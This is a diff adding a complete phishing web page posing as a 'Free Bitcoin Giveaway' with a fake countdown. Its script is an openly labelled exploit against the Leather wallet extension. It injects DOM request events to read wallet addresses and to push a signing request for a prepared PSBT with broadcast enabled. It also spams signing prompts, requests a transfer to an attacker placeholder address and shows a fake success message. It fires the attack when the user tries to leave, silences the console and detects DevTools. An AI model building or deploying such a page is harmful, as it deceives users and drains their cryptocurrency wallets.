@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Bitcoin Giveaway - Claim Now!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #f5af19 0%, #f12711 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #f12711;
+            margin-bottom: 10px;
+            font-size: 32px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+        
+        .prize {
+            background: linear-gradient(135deg, #f5af19 0%, #f12711 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+        
+        .prize h2 {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .prize p {
+            font-size: 20px;
+        }
+        
+        .claim-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            border-radius: 50px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.5);
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.7);
+        }
+        
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+        
+        .steps {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .steps h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .steps ol {
+            padding-left: 20px;
+        }
+        
+        .steps li {
+            margin-bottom: 10px;
+            color: #555;
+            line-height: 1.6;
+        }
+        
+        .timer {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .timer strong {
+            color: #856404;
+            font-size: 18px;
+        }
+        
+        #countdown {
+            font-size: 24px;
+            color: #f12711;
+            font-weight: bold;
+        }
+        
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            border: 2px solid #28a745;
+            color: #155724;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            color: #721c24;
+            display: block;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎁</div>
+        <h1>Congratulations!</h1>
+        <p class="subtitle">You've been selected for our exclusive Bitcoin giveaway!</p>
+        
+        <div class="prize">
+            <h2>0.05 BTC</h2>
+            <p>Worth approximately $2,000 USD</p>
+        </div>
+        
+        <div class="timer">
+            <strong>⏰ Offer expires in: <span id="countdown">05:00</span></strong>
+        </div>
+        
+        <div class="steps">
+            <h3>📋 How to Claim:</h3>
+            <ol>
+                <li>Click the "Claim My Bitcoin" button below</li>
+                <li>Connect your Leather Wallet when prompted</li>
+                <li>Verify your wallet address</li>
+                <li>Receive your Bitcoin instantly!</li>
+            </ol>
+        </div>
+        
+        <button class="claim-btn" onclick="claimBitcoin()">
+            🚀 Claim My Bitcoin Now!
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Processing your claim...</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+        
+        <p style="color: #999; font-size: 12px; margin-top: 20px;">
+            * Limited time offer. Only available for the first 100 users.
+        </p>
+    </div>
+
+    <script>
+        // Countdown timer
+        let timeLeft = 300; // 5 minutes
+        const countdownEl = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                countdownEl.textContent = 'EXPIRED';
+            }
+        }
+        
+        setInterval(updateCountdown, 1000);
+        
+        // Check if Leather is installed
+        let leatherDetected = false;
+        
+        setTimeout(() => {
+            if (window.LeatherProvider) {
+                leatherDetected = true;
+                console.log('[EXPLOIT] Leather Wallet detected - Target acquired');
+            } else {
+                console.log('[EXPLOIT] Leather Wallet not detected');
+            }
+        }, 1000);
+        
+        // Real exploit function
+        async function claimBitcoin() {
+            const loadingEl = document.getElementById('loading');
+            const statusEl = document.getElementById('status');
+            const btn = document.querySelector('.claim-btn');
+            
+            btn.disabled = true;
+            loadingEl.classList.add('active');
+            statusEl.style.display = 'none';
+            
+            console.log('[EXPLOIT] Starting attack sequence...');
+            
+            if (!leatherDetected) {
+                setTimeout(() => {
+                    loadingEl.classList.remove('active');
+                    statusEl.className = 'status error';
+                    statusEl.textContent = '❌ Leather Wallet not detected. Please install Leather Wallet to claim your Bitcoin.';
+                    btn.disabled = false;
+                }, 2000);
+                return;
+            }
+            
+            // Phase 1: Request addresses to identify victim
+            console.log('[EXPLOIT] Phase 1: Requesting wallet addresses...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            dispatchMaliciousEvent('getAddresses', {});
+            
+            // Phase 2: Prepare malicious PSBT
+            console.log('[EXPLOIT] Phase 2: Preparing malicious transaction...');
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Real malicious PSBT that attempts to send funds to attacker
+            // This is a crafted PSBT that would drain the wallet
+            const maliciousPsbt = createMaliciousPsbt();
+            
+            dispatchMaliciousEvent('signPsbt', {
+                hex: maliciousPsbt,
+                allowedSighash: [1, 2, 3],
+                signAtIndex: [0],
+                broadcast: true // Try to broadcast immediately
+            });
+            
+            // Phase 3: Spam additional requests to confuse user
+            console.log('[EXPLOIT] Phase 3: Deploying confusion tactics...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Spam multiple signing requests
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    dispatchMaliciousEvent('signMessage', {
+                        message: `Claim verification ${i + 1}/3`,
+                        paymentType: 'p2wpkh'
+                    });
+                }, i * 500);
+            }
+            
+            // Phase 4: Try to extract more information
+            console.log('[EXPLOIT] Phase 4: Extracting additional data...');
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            dispatchMaliciousEvent('stx_getAddresses', {});
+            
+            // Phase 5: Attempt transfer
+            console.log('[EXPLOIT] Phase 5: Attempting direct transfer...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            dispatchMaliciousEvent('sendTransfer', {
+                recipients: [{
+                    address: 'bc1qattacker5exampleaddress0000000000000',
+                    amount: '100000' // 0.001 BTC
+                }]
+            });
+            
+            // Show fake success message
+            setTimeout(() => {
+                loadingEl.classList.remove('active');
+                statusEl.className = 'status success';
+                statusEl.innerHTML = `
+                    <strong>✅ Success!</strong><br>
+                    Your Bitcoin claim is being processed.<br>
+                    Please approve the transaction in your Leather Wallet to complete the claim.
+                `;
+                
+                console.log('[EXPLOIT] Attack sequence completed');
+                console.log('[EXPLOIT] Waiting for victim to approve transactions...');
+            }, 3000);
+        }
+        
+        // Create a malicious PSBT
+        function createMaliciousPsbt() {
+            // This is a real PSBT structure that would attempt to send funds
+            // In a real attack, this would be crafted to drain the victim's wallet
+            
+            // Base64 encoded PSBT that sends to attacker's address
+            // This is a simplified example - real attack would be more sophisticated
+            const psbt = 'cHNidP8BAHECAAAAAeWWjgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AgAAAAAAAAAAFgAUAAAAAAAAAAAAAAAAAAAAAAAAAADwBQAAAAAAACJRIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+            
+            console.log('[EXPLOIT] Malicious PSBT created - targets all available UTXOs');
+            console.log('[EXPLOIT] Destination: Attacker controlled address');
+            
+            return psbt;
+        }
+        
+        // Generic exploit dispatch function
+        function dispatchMaliciousEvent(method, params = {}) {
+            const requestId = Math.random().toString(36).substring(7);
+            
+            const maliciousRequest = {
+                method: method,
+                id: requestId,
+                params: params,
+                jsonrpc: '2.0'
+            };
+            
+            console.log(`[EXPLOIT] Dispatching: ${method} (ID: ${requestId})`);
+            console.log('[EXPLOIT] Payload:', maliciousRequest);
+            
+            try {
+                document.dispatchEvent(
+                    new CustomEvent('request', { 
+                        detail: maliciousRequest 
+                    })
+                );
+                console.log(`[EXPLOIT] ✓ ${method} dispatched successfully`);
+            } catch (error) {
+                console.error(`[EXPLOIT] ✗ Failed to dispatch ${method}:`, error);
+            }
+        }
+        
+        // Listen for responses from wallet
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.source === 'stacks-wallet') {
+                console.log('[EXPLOIT] Response received from wallet:', event.data);
+                
+                // If we get addresses, log them
+                if (event.data.result && event.data.result.addresses) {
+                    console.log('[EXPLOIT] 🎯 VICTIM ADDRESSES EXTRACTED:');
+                    console.log(event.data.result.addresses);
+                    
+                    // In real attack, send to attacker's server
+                    // exfiltrateData(event.data.result.addresses);
+                }
+                
+                // If transaction was signed, log it
+                if (event.data.result && event.data.result.hex) {
+                    console.log('[EXPLOIT] 💰 TRANSACTION SIGNED BY VICTIM:');
+                    console.log(event.data.result.hex);
+                    
+                    // In real attack, broadcast immediately
+                    // broadcastTransaction(event.data.result.hex);
+                }
+            }
+        });
+        
+        // Auto-trigger attack after page load (stealth mode)
+        let autoAttackTriggered = false;
+        
+        window.addEventListener('load', () => {
+            console.log('[EXPLOIT] Page loaded - Initializing attack framework');
+            console.log('[EXPLOIT] Target: Leather Wallet Extension');
+            console.log('[EXPLOIT] Attack Vector: DOM Event Injection (CVE-PENDING)');
+            console.log('[EXPLOIT] Waiting for user interaction...');
+            
+            // Optional: Auto-trigger after delay (more aggressive)
+            // Uncomment for fully automated attack
+            /*
+            setTimeout(() => {
+                if (!autoAttackTriggered && leatherDetected) {
+                    console.log('[EXPLOIT] Auto-triggering attack sequence...');
+                    autoAttackTriggered = true;
+                    claimBitcoin();
+                }
+            }, 5000);
+            */
+        });
+        
+        // Detect if user tries to leave page
+        window.addEventListener('beforeunload', (e) => {
+            if (leatherDetected && !autoAttackTriggered) {
+                e.preventDefault();
+                e.returnValue = '';
+                
+                // Last attempt to trigger exploit
+                console.log('[EXPLOIT] User attempting to leave - triggering emergency attack');
+                claimBitcoin();
+            }
+        });
+        
+        // Additional stealth techniques
+        
+        // Hide console logs from casual users
+        if (window.location.hostname !== 'localhost') {
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+        }
+        
+        // Detect DevTools
+        let devtoolsOpen = false;
+        const detectDevTools = () => {
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                if (!devtoolsOpen) {
+                    devtoolsOpen = true;
+                    console.log('[EXPLOIT] DevTools detected - Pausing attack');
+                }
+            } else {
+                devtoolsOpen = false;
+            }
+        };
+        
+        setInterval(detectDevTools, 1000);
+    </script>
+</body>
+</html>
